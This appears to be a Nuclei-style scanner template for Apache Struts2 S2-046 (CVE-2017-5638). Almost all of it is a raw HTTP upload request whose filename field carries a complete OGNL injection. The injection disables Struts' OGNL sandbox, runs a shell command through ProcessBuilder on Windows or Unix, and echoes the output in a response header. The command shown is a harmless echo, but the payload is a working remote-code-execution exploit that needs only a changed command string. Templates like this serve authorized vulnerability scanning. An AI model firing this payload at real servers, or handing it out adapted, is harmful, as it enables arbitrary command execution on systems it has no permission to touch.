id: local-struts2-s2-046-cmd-rce

info:
  name: Local Struts2 S2-046 Command Execution via Filename (CVE-2017-5638)
  author: pentest-platform
  severity: critical
  tags: safe-poc,exploit,struts2,s2-046,cve,cve2017,rce

# S2-046 exploits OGNL injection via Content-Disposition filename field in multipart uploads.
# The NUL byte (\x00) in the filename triggers JakartaMultiPartRequest.buildErrorMessage()
# which evaluates the OGNL expression from the malformed filename.
# Distinct from S2-045 (Content-Type header injection). Affects Struts2 2.3.5-2.3.31 and 2.5-2.5.10.

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryS046Test

        ------WebKitFormBoundaryS046Test
        Content-Disposition: form-data; name="upload"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo pentest-platform-s2046-rce').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))).(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-S2-046-RCE',#ros.trim()))}{{hex_decode("00")}}b"
        Content-Type: text/plain

        foo
        ------WebKitFormBoundaryS046Test--

    matchers:
      - type: word
        part: header
        words:
          - "pentest-platform-s2046-rce"
    extractors:
      - type: regex
        name: rce_output
        part: header
        regex:
          - "X-S2-046-RCE: (.+)"
